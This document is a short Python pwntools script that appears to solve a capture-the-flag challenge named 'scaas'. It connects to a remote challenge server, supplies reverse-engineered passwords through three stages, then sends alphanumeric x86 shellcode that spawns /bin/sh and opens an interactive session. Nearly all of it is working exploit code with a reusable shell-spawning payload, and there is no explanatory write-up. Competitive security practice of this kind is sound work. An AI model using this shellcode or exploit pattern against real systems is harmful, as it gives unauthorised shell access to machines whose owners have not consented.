#!/usr/bin/env python
from pwn import *

context.arch = "amd64"
context.encoding = "latin"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./chall")

gdbscript = """
b *scaas+236
c
"""

# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript)
p = remote("scaas-1.play.hfsc.tf", 1337)

# menu
p.recv()
p.sendline("2")

# stage 1
p.sendlineafter("Enter password 0:", str(0x916d00))
p.sendlineafter("Enter password 1:", str(0x707817))
p.sendlineafter("Enter password 2:", str(3333))
p.sendlineafter("Enter password 3:", str(0x840BC2))
p.sendlineafter("Enter password 4:", str(0x89228A))

p.recv()

# stage 2
p.sendlineafter("Enter password 0:", str(1243932))      # 1318 * password_two[0] % 0x31EF03u == 4425
p.sendlineafter("Enter password 1:", str(3103430))             # 3103430
p.sendlineafter("Enter password 2:", str(262505 - 456)) # dword_409C + 456 == dword_40A0
p.sendlineafter("Enter password 3:", str(262505))       # dword_40A0 = 262505
p.sendlineafter("Enter password 4:", str(9378717))             # dword_40A4 % 0x2B6u == 1

# stage 3
p.sendlineafter("Enter password 0:", str(0x206c5a))
p.sendlineafter("Enter password 1:", str(9874561))
p.sendlineafter("Enter password 2:", str(6288407))
p.sendlineafter("Enter password 3:", str(6280405))
p.sendlineafter("Enter password 4:", str(6791500))


p.recv()
# shellcode from https://github.com/NT-TNT/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-
sc = b"hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz"
p.sendlineafter(b"max 500 bytes): ", sc)

p.interactive()
